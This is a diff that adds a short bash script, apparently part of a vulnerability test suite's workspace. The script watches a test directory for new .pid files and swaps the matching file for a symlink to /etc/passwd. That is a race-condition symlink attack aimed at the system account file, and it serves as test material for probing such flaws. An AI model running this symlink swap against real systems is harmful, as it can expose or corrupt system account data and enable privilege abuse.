@@ -1,0 +1,3 @@
+#!/bin/bash
+
+inotifywait -m -e create --format "%f" /opt/stonesoup/workspace/testData/ | while read NEW_FILE; do if [[ "${NEW_FILE}" == *.pid ]]; then REPLACE_FILE="${NEW_FILE%.pid}"; sleep 1; echo "Replacing: " "/opt/stonesoup/workspace/testData/${REPLACE_FILE}" && rm -f "/opt/stonesoup/workspace/testData/${REPLACE_FILE}" && ln -s /etc/passwd "/opt/stonesoup/workspace/testData/${REPLACE_FILE}" && echo "Replaced."; else echo "Ignoring: " "/opt/stonesoup/workspace/testData/${NEW_FILE}"; fi; done;
